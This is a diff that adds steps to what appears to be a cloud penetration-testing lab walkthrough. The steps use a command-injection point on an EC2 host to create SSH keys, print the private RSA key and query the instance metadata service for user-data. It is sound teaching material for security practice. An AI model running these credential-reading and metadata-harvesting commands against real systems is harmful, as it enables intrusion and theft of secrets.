@@ -1590,3 +1590,43 @@ aws elbv2 describe-load-balancers --profile lara
 <p align="center">
   <img src="/images/cloud/webpage_full.png">
 </p>
+
+* Find _command injection_ using the following command.
+
+```bash
+ls	
+```
+
+<p align="center">
+  <img src="/images/cloud/rce_ls.png">
+</p>
+
+* Create a new set of SSH keys.
+
+```bash
+ssh-keygen -t rsa -C "geekfreak" -f "/home/ubuntu/.ssh/id_rsa" -P ""
+```
+
+<p align="center">
+  <img src="/images/cloud/ssh_keys_rce.png">
+</p>
+
+* Read the RSA Key.
+
+```bash
+cat /home/ubuntu/.ssh/id_rsa
+```
+
+<p align="center">
+  <img src="/images/cloud/cat_rsa_key.png">
+</p>
+
+* Check for user data specified during the creation of the EC2 instance.
+
+```bash
+curl http://169.254.169.254/latest/user-data
+```
+
+<p align="center">
+  <img src="/images/cloud/user_data.png">
+</p>
